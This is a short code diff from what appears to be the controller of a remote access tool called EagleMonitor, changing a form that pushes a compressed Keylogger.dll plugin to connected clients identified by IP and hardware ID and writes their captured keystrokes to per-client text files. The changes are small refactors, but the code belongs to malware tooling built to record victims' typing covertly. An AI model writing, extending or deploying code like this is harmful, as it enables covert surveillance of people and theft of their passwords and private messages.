@@ -42,7 +42,7 @@ namespace EagleMonitor.Forms
             {
                 KeylogPacket keylogPacket = new KeylogPacket(clientHandler.IP, clientHandler.HWID);
                 keylogPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Keylogger.dll"), 1);
-                clientHandler.SendPacket(keylogPacket);
+                this.clientHandler.SendPacket(keylogPacket);
             }
             hasAlreadyConnected = false;
             this.startKeylogGuna2Button.Enabled = true;
@@ -60,18 +60,14 @@ namespace EagleMonitor.Forms
 
         private void closeButton_Click(object sender, EventArgs e)
         {
-            if (clientHandler != null && hasAlreadyConnected == true)
+            if (hasAlreadyConnected == true)
             {
                 KeylogPacket keylogPacket = new KeylogPacket(clientHandler.IP, clientHandler.HWID);
                 keylogPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Keylogger.dll"), 1);
-                clientHandler.SendPacket(keylogPacket);
+                this.clientHandler.SendPacket(keylogPacket);
             }
-
             Directory.CreateDirectory(ClientHandler.ClientHandlersList[baseIp].clientPath + "\\Keystrokes\\");
             File.WriteAllText(ClientHandler.ClientHandlersList[baseIp].clientPath + "\\Keystrokes\\"  + Utils.Miscellaneous.DateFormater() + ".txt", keystrokeRichTextBox.Text);
-            hasAlreadyConnected = false;
-            this.startKeylogGuna2Button.Enabled = true;
-            this.startKeylogGuna2Button.Text = "Start Keylogger";
             this.Close();
         }
 
